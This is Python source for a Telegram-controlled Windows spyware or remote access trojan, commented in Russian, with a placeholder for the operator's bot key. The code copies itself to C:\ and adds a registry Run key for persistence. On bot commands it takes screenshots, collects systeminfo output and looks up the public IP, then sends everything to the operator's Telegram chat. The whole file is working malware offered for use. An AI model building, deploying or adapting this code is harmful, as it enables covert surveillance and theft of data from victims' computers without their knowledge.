import io
import requests
import telebot
import mss
from PIL import Image
import subprocess
import sys
import os
import shutil
import winreg


tg_bOt = telebot.TeleBot("!!!YOUR-API-TELEGRAM-BOT-KEY-HERE!!!")  # <---- Вставить свой API ключ 

@tg_bOt.message_handler(commands=['screen'])
def send_screenshot(message):
    chAt_id = message.chat.id

    with mss.mss() as sct:
        moonitor = sct.monitors[0]
        sccreenshot = sct.grab(moonitor)

        screenshot_buffer = io.BytesIO()
        Image.frombytes('RGB', sccreenshot.size, sccreenshot.rgb).save(screenshot_buffer, format='PNG')
        screenshot_buffer.seek(0)

        tg_bOt.send_photo(chAt_id, screenshot_buffer)

# Создание копии 

def create_copy():
    current_file = sys.argv[0]
    target_directory = 'C:\\' # <--- Если нужно, укажите желаемую директорию для копии файла.
    filename = os.path.basename(current_file)
    target_path = os.path.join(target_directory, filename)
    shutil.copy(current_file, target_path)

create_copy()


# Добавление в авторан
def create_marker_file():
    marker_path = "C:\\Wayne.marker"  # <--- Если нужно, укажите желаемую директорию для маркера.
    with open(marker_path, "w") as file:
        file.write("Marker file for Wayne")

def is_first_run():
    marker_path = "C:\\Wayne.marker" # <--- Если изменили путь маркера, укажите его также здесь
    return not os.path.exists(marker_path)
    
def add_to_startup(file_path):
    executable = os.path.abspath(file_path)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "Wayne.exe", 0, winreg.REG_SZ, executable)
    winreg.CloseKey(key)
file_path = "C:\\Wayne.exe"  # <---- Если указывали новый путь копии, укажите также здесь
if is_first_run():
    shutil.copyfile(sys.executable, file_path)
    add_to_startup(file_path)
    create_marker_file()


# Получить инфо о системе
@tg_bOt.message_handler(commands=['systeminfo'])
def systeminfo(message):
    try:
        #startupinfoo = subprocess.STARTUPINFO()
        #startupinfoo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        result = subprocess.run("systeminfo", capture_output=True, text=True)
        if result.returncode == 0:
            #Save result in txt
            output_file = "sysinfo.txt"
            with open(output_file, 'w', encoding='utf-8') as file:
                file.write(result.stdout)
            #Send result in TG
            with open(output_file, 'rb') as file:
                tg_bOt.send_document(message.chat.id, file)
            #Deleting tmp file
            os.remove(output_file)
        else:
            tg_bOt.reply_to(message, "Failed to retrieve a systeminfo")
    except Exception as e:
        tg_bOt.reply_to(message, f"Error executing systeminfo command: {str(e)}")



# Получить IP
@tg_bOt.message_handler(commands=['ip'])
def send_ip(message):
    response = requests.get("https://api.ipify.org/?format=json")
    if response.status_code == 200:
        ip_address = response.json()["ip"]
        tg_bOt.reply_to(message, f"IP address: {ip_address}")
    else:
        response = requests.get("http://ip-api.com/json")
        if response.status_code == 200:
            ip_address = response.json()["query"]
            tg_bOt.reply_to(message, f"IP address: {ip_address}")
        else:
            tg_bOt.reply_to(message, "Failed to retrieve IP-Address")

tg_bOt.polling()
